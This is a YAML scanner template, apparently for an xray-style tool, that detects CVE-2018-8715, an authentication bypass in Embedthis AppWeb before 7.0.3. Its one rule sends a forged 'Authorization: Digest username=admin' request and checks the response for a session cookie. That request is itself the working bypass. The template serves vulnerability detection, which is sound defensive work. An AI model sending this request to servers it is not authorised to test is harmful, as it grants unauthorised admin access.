id: CVE-2018-8715

info:
  name: AppWeb Authentication Bypass vulnerability
  author: milo2012
  severity: high
  description: The Embedthis HTTP library, and Appweb versions before 7.0.3, have a logic flaw related to the authCondition function in http/httpLib.c. With a forged HTTP request, it is possible to bypass authentication for the form and digest login types.
  reference:
    - https://github.com/embedthis/appweb/issues/610
    - https://blogs.securiteam.com/index.php/archives/3676
    - https://security.paloaltonetworks.com/CVE-2018-8715

rules:
  r0:
    request:
      method: GET
      path: /
      headers:
        Authorization: Digest username=admin
    expression: response.status == 200 && response.raw_header.bcontains(b'Set-Cookie:') && response.raw_header.bcontains(b'<a class="logo" href="https://embedthis.com/">&nbsp;</a>')
expression: r0()